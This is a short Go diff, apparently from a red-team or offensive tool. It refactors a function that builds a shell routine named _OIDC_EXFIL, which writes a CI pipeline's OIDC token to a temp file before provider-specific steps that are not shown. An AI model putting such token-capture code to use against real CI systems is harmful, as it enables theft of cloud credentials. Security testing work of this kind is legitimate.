@@ -62,14 +62,14 @@ func defaultAudience(provider string) string {
 func buildOIDCScript(o OIDCFederationOptions) string {
 	var b strings.Builder
 
-	b.WriteString(fmt.Sprintf(`_OIDC_EXFIL() {
+	fmt.Fprintf(&b, `_OIDC_EXFIL() {
   local _d
   _d=$(mktemp -d)
 
   # Step 1: Capture the OIDC token
   echo "$%s" > "$_d/oidc_token.txt" || true
 
-`, o.TokenName))
+`, o.TokenName)
 
 	switch strings.ToLower(o.Provider) {
 	case "gcp":
